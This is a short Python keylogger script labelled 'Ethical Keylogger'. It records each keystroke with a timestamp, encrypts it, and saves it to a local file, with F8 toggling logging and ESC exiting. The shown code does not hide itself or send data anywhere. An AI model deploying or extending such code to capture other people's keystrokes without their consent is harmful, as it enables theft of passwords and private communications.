from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime

LOG_FILE = "logs.enc"
KEY_FILE = "key.key"

logging_enabled = False

# Load encryption key
with open(KEY_FILE, "rb") as f:
    key = f.read()

cipher = Fernet(key)

def save_encrypted(entry):
    encrypted = cipher.encrypt(entry.encode())
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted + b"\n")

def on_press(key):
    global logging_enabled
    if not logging_enabled:
        return

    try:
        entry = f"{datetime.now()} | {key.char}"
    except AttributeError:
        entry = f"{datetime.now()} | [{key}]"

    save_encrypted(entry)

def on_release(key):
    global logging_enabled

    # Toggle logging with F8
    if key == keyboard.Key.f8:
        logging_enabled = not logging_enabled
        print("[+] Logging ON" if logging_enabled else "[-] Logging OFF")

    # Exit with ESC
    if key == keyboard.Key.esc:
        print("[!] Exiting")
        return False

print("Ethical Keylogger Running")
print("F8 = Start / Stop logging")
print("ESC = Exit")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
